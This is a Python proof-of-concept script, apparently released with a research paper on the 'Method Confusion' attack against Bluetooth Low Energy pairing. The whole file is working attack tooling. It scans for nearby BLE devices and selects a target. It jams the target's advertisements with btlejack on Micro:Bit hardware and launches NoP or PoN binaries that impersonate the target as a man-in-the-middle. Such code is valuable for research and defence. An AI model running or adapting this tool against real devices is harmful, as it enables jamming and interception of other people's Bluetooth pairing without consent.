#!/usr/bin/env python3
# POC of end2end attack for the paper "Method Confusion Attack on the Bluetooth Pairing Process"
# By maxdos & lupinglui

#from __future__ import print_function, unicode_literals

BTLEJACK_SOURCE_PATH = "btlejack/"
DISCOVERY_BINARY = "discovery/discovery"
NOP_BINARY_PATH = "numeric_entry/numeric_entry"
PON_BINARY_PATH = "numeric_entry_reverse/numeric_entry_reverse"
SCAN_TIMEOUT_SECONDS = 7
SLEEP_TIME_BETWEEN_PACKET_PROCESSING = 0.01
PATTERN_POSITION_MAC = 2

import sys
import os
import subprocess
import select
import threading
import time
import re
import signal
from binascii import hexlify, unhexlify

sys.path.insert(1, BTLEJACK_SOURCE_PATH)

from btlejack.ui import CLIAdvertisementsSniffer, CLIAdvertisementsJammer, ForcedTermination
from btlejack.helpers import *
from btlejack.link import DeviceError

# Dialog menu imports
import argparse
from pprint import pprint
from PyInquirer import style_from_dict, Token, prompt, Separator
from examples import custom_style_2


# Dialogues
question_init = [
    {
        'type': 'list',
        'name': 'dev',
        'message': 'Which device do you want to use as MitM Initiator?',
        'choices': []
    }]

question_resp = [
    {
        'type': 'list',
        'name': 'dev',
        'message': 'Which device do you want to use as MitM Responder?',
        'choices': []
    }]

question_scan = [
    {
        'type': 'list',
        'name': 'dev',
        'message': 'Which device do you want to use as watchdog (reacting to adv_addr changes)?',
        'choices': []
    }]

question_target = [
    {
        'type': 'list',
        'name': 'target',
        'message': 'Which Responder do you want to overshadow?',
        'choices': []
    }]

question_attack_variant = [
    {
        'type': 'list',
        'name': 'var',
        'message': 'Which attack variant shall be performed?',
        'choices': [
        'None',
        'PoN',
        'NoP']
    }]

# Globals
jammer = None
jammer_mutex = threading.Lock()
current_target_addr = None
sniffer = None
sniffing = True
sniffer_mutex = threading.Lock()
pattern_position = None

# Helper functions
def is_valid_mac(arg_value, pat=re.compile(r"[0-9a-f]{2}:([0-9a-f]{2}:){4}[0-9a-f]{2}$")):
    """ Checks if arg_value is a valid MAC e.g Aa:12:aa:bb:aa:ff and returns lowercased string """
    if not pat.match(arg_value.lower()):
        raise argparse.ArgumentTypeError
    return arg_value.lower()

def is_attack_type(arg_value):
    """ Checks if arg_value is either string 'pon' or 'nop' (casinsensitive) and returns True for NoP, None for no attack"""
    arg_value = arg_value.lower()
    if arg_value != 'pon' and arg_value != 'nop' and arg_value != 'none':
        raise argparse.ArgumentTypeError
    return arg_value

def remove_by_pattern(l, pattern):
    """ Removes first element in string-list which matches pattern """
    for e, s in enumerate(l):
        if(pattern in s):
            del l[e]
            return

def signal_handler(sig, frame):
    print('Received SIGINT -> Shutting down gracefuly!')
    if(jammer is not None):
        print("\tDisabling jamming")
        jammer_mutex.acquire()
        jammer.disable_adv_jamming()
        jammer_mutex.release()

        while(True):
            jammer_mutex.acquire()
            if(jammer.interface.is_idle()):
                break
            jammer_mutex.release()
            time.sleep(0.05)

    # jamming_packet_processing will be killed by _exit(0)
    print("Bye")
    os._exit(0)

class PatternMatcher:
    def __init__(self, pattern=None):
        self.pattern = pattern

    def write_packet(self, a, b, c, packet):

        global sniffing
        global pattern_position
        global current_target_addr

        pos = packet.find(self.pattern)
        if pos != -1:
            pattern_position = pos - 10
            sniffing = False
            sniffer.disable_adv_sniffing()

            print(packet)
            current_target_addr = packet[12:18].hex()
            print(current_target_addr)

def main():
    """ Main routine """

    global jammer
    global sniffer
    global current_target_addr
    global pattern_postition

    parser = argparse.ArgumentParser(description='Method Confusion BLE attack tool.')
    parser.add_argument('-i', '--initiator', dest='init_dev_num', type=int, default=None, help='lsusb number of MitM initiator device')
    parser.add_argument('-r', '--responder', dest='resp_dev_num', type=int, default=None, help='lsusb number of MitM initiator device')
    parser.add_argument('-t', '--target-mac', dest='target_mac', type=is_valid_mac, default=None, help='MAC address of the target (if not provided BLE scanning will be initiated)')
    parser.add_argument('-j', '--jamming-pattern', dest='target_pattern', type=str, default=None, help='Target\'s pattern to scan for (for a faster attack initiation)')
    parser.add_argument('-p', '--pattern-position', dest='pattern_position', type=int, default=None, help='Target\'s pattern position in advertisement packet')
    parser.add_argument('-a', '--attack-variant', dest='attack_variant', type=is_attack_type, default=None, help='Variant of attack (\'PoN\' or \'NoP\', \'None\' - just jamming\')')
    parser.add_argument('-n', '--overshadow-name', dest='overshadow_name', type=str, default=None, help='If provided the name the MitM advertises (otherwise the overshadow targets name)')
    parser.add_argument('-f', '--force-address', dest='force_addr', type=bool, default=False, help='use pattern for address resolution only')

    args = parser.parse_args()
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    if(args.init_dev_num is None or args.resp_dev_num is None):
        process = subprocess.Popen(['lsusb'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, _ = process.communicate()
        usb_devices = stdout.decode().split("\n")

    if(args.init_dev_num is None):
        question_init[0]['choices'].extend(usb_devices)
        choice = prompt(question_init, style=custom_style_2)['dev']
        args.init_dev_num = int(choice[choice.index('Device ') + 7:][:3])
        # Remove selected from list
        remove_by_pattern(usb_devices, choice)

    if(args.resp_dev_num is None):
        question_resp[0]['choices'].extend(usb_devices)
        choice = prompt(question_resp, style=custom_style_2)['dev']
        args.resp_dev_num = int(choice[choice.index('Device ') + 7:][:3])
        # Remove selected from list
        remove_by_pattern(usb_devices, choice)

    if(args.attack_variant is None):
        args.attack_variant = prompt(question_attack_variant, style=custom_style_2)['var'].lower()

    if(args.target_pattern is not None):
        args.target_pattern = args.target_pattern.encode()

    if(args.target_mac is not None):
        args.target_pattern = bytes.fromhex(args.target_mac.replace(":","")[::-1])
        args.pattern_position = PATTERN_POSITION_MAC

    if(args.target_pattern is None):
        args.target_pattern, target_name = search_target(args.init_dev_num, args.target_pattern)
        args.target_pattern = bytes.fromhex(args.target_pattern.replace(":","")[::-1])
        args.pattern_position = PATTERN_POSITION_MAC
        if(args.overshadow_name is None):
            args.overshadow_name = target_name

    if(args.pattern_position is None):
        out = PatternMatcher(pattern=args.target_pattern)
        # start sniffer for pattern detection
        try:
            sniffer = CLIAdvertisementsSniffer(verbose=True, output=out, no_stdout=True)
        except DeviceError as error:
            print('Error: Please connect a compatible Micro:Bit in order to use BtleJack for jamming')
            exit(-1)
        sniffing_packet_processing()
        args.pattern_position = pattern_position
        args.target_mac = current_target_addr

    if(args.force_addr):
        args.pattern_position = PATTERN_POSITION_MAC
        args.target_pattern = bytes.fromhex(current_target_addr)


    if(len(args.overshadow_name) == 0):
        print("Error: No overshadow name determined")
        exit(0)

    current_target_addr = args.target_mac
    print("Jamming all advertisements of {current_target_addr} {target_name}")
    time.sleep(1)

    # Start jammer
    try:
        jammer = CLIAdvertisementsJammer(verbose=False, pattern=args.target_pattern, position=args.pattern_position)
    except DeviceError as error:
        print('Error: Please connect a compatible Micro:Bit in order to use BtleJack for jamming')
        exit(-1)

    # Start jammer background process
    jammer_process = threading.Thread(target=jamming_packet_processing)
    jammer_process.start()

    if(args.attack_variant == 'none'):
        while(True):
            time.sleep(1)

    if(args.attack_variant == 'nop'):
        attack_process = subprocess.Popen([NOP_BINARY_PATH, str(args.init_dev_num), str(args.resp_dev_num), args.overshadow_name], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
    elif(args.attack_variant == 'pon'):
        attack_process = subprocess.Popen([PON_BINARY_PATH, str(args.init_dev_num), str(args.resp_dev_num), args.overshadow_name], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
    else:
        print("invalid attack_variant \"" + args.attack_variant + "\"")

    while True:
        # result = attack_process.stderr.readline()
        result = attack_process.stdout.readline()

        print(result)
        if(b"Please provide" in result):
            print("Target has connected to MitM responder -> Stop jamming")
            jammer_mutex.acquire()
            jammer.disable_adv_jamming()
            jammer_mutex.release()

            print("Starting MitM-Responder")
            # No race-condition expected as watchdog has been terminated
            attack_process.stdin.write(current_target_addr.encode() + b"\n")
            attack_process.stdin.flush()

        return_code = attack_process.poll()
        if return_code is not None:
            print("Warning: watchdog died :(")
            break


def sniffing_packet_processing():

    global sniffing
    global sniffer

    while sniffing:
        sniffer_mutex.acquire()
        sniffer.process_packets()
        sniffer_mutex.release()
        #time.sleep(SLEEP_TIME_BETWEEN_PACKET_PROCESSING)


def jamming_packet_processing():

    global jammer

    while(True):
        jammer_mutex.acquire()
        jammer.process_packets()
        jammer_mutex.release()
        time.sleep(SLEEP_TIME_BETWEEN_PACKET_PROCESSING)


def search_target(scan_dev_num, target_pattern):
    """ Scans for nearby BLE devices and offers pattern matching on their names or menu selection """

    while(True):
        print(f"Conducting BLE scan ({SCAN_TIMEOUT_SECONDS} seconds)")
        begin_line_counter = 0
        target_options = {}
        # Start BLE scan
        process = subprocess.Popen([DISCOVERY_BINARY, str(scan_dev_num)], stdout=subprocess.PIPE)
        poll_obj = select.poll()
        poll_obj.register(process.stdout, select.POLLIN)
        timeout = time.time() + SCAN_TIMEOUT_SECONDS
        while True:

            # Stop process gracefuly after time-limit
            if(time.time() > timeout):
                process.send_signal(signal.SIGINT)

            # Abort if process died/killed
            return_code = process.poll()
            if return_code is not None:
                break

            # Check if data is available
            if(not poll_obj.poll(0)):
                continue

            # Check results to allow pattern matching
            result = process.stdout.readline()
            # Ugly hack to skip first lines of output
            if(begin_line_counter < 6):
                begin_line_counter += 1
                continue

            result = result.strip().decode().split(', ')

            try:
                result[0] = is_valid_mac(result[0])
            except(argparse.ArgumentTypeError):
                continue

            if len(result) == 3 and result[2] is not None and target_pattern is not None and target_pattern in result[2]:
                print(f"Found target: {result}")
                return result[0]
            if result[0] not in target_options or target_options[result[0]] is None:
                if(len(result) < 3):
                    target_options[result[0]] = None
                    continue
                target_options[result[0]] = result[2]


        if(target_options is not None):
            print("Could not identify target -> prompting alternatives")

        # Draw menu
        question_target[0]['choices'].extend(str(target_options)[1:-1].split(','))
        question_target[0]['choices'].append('New scan')
        choice = prompt(question_target, style=custom_style_2)['target']
        if("New scan" in choice):
            question_target[0]['choices'] = []
            continue

        # Found target to attack
        choice = choice.strip().split(': ')
        choice = [choice[0][1:-1], choice[1][1:-1]]
        print(choice)
        return choice

if __name__ == "__main__":
    main()
